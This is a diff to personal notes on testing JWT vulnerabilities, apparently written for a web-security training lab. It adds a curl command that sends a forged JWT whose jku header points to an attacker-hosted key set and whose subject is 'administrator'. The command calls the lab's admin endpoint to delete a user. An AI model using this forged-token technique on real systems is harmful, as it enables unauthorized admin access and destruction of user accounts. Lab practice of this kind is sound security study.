@@ -20,3 +20,10 @@ Testing for JWT vulnerabilities:
 - Add the public key in the exploit server
 - Modify the JWT to include the jku parameter and the subject administrator
 - sign the jwt using the private key 
+
+OK I CAN USE CURL COMMAND TO SOLVE THIS AS WELL: 
+SABAI JWT KO PROCESS MIIIIIIILAUNE TOKEN HARU AND THEN: 
+curl -X GET "https://0ab3008203bf8a8280e3305a00f200e6.web-security-academy.net/admin/delete?username=carlos" -b "session=eyJraWQiOiI0MmI0NTkxYS1iZWZmLTQxYzAtYTg4Ni1kYmViNWFkMDM2ZTkiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYWVlMDAyOTAzYzQ4YWI0ODBmNTJmZDEwMWY1MDAwZi5leHBsb2l0LXNlcnZlci5uZXQvand0cyJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTExNDQ2NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.g4Dzuc-7qfHZG9D_jtC220JzeeFf_0CYvKmQUGHp8fPoC8b1AdHOqQt6EXTG0geaKmWa2MdFFeEdcBejVUNISlBSugQbvzzMl3Zr5XWjrglYJildMtcU3wiTrpidKBg4GdYLoLlUMWxi1tXlx5pZUlM6nuv4UNTWIp4X01QgL8G0TwHBaMs9CjKpw6wSlhWkkH5Brxk1ihQnBVWk4eBm-gAKl2LTUQ_az0OFYigrI9NltsBQcX7VdA7Ag9gkYa5io2k_CPXWEA6JwbKUinYGdERgxLDPTmWdoGNCUvy15Nd-iUrPruLfOYll_3x1brT90YEbXtnA65a16z6Bi-xEjA" -i
+
+here: -b --> this is for the cookie 
+      -i --> to include the HTTP response header
